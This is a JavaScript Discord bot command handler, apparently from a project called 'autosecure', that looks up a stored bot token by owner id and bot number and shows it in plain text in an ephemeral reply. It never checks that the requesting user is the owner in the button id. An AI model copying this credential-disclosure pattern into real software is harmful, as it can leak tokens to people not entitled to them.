const { codeblock } = require("../../../autosecure/utils/process/helpers");
const { queryParams } = require("../../../db/database");
const { EmbedBuilder } = require("discord.js");

module.exports = {
    name: "copytokenbot",
    editbot: true,
    callback: async (client, interaction) => {
        await interaction.deferReply({
            ephemeral: true
        });

        let [t, ownerid, botnumber] = interaction.customId.split("|");

        try {
            let settings = await queryParams(
                `SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?`,
                [ownerid, botnumber]
            );

            settings = settings[0];
            let token = settings?.token;

            if (!token) {
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle("No token found for this bot!")
                            .setColor(0xF59E0B)
                    ]
                });
            } else {
                let text = codeblock(token);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setDescription(text)
                            .setColor(0xF59E0B)
                    ]
                });
            }
        } catch (err) {
            await interaction.editReply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Failed to get the token!")
                        .setColor(0xF59E0B)
                ]
            });
        }
    }
};
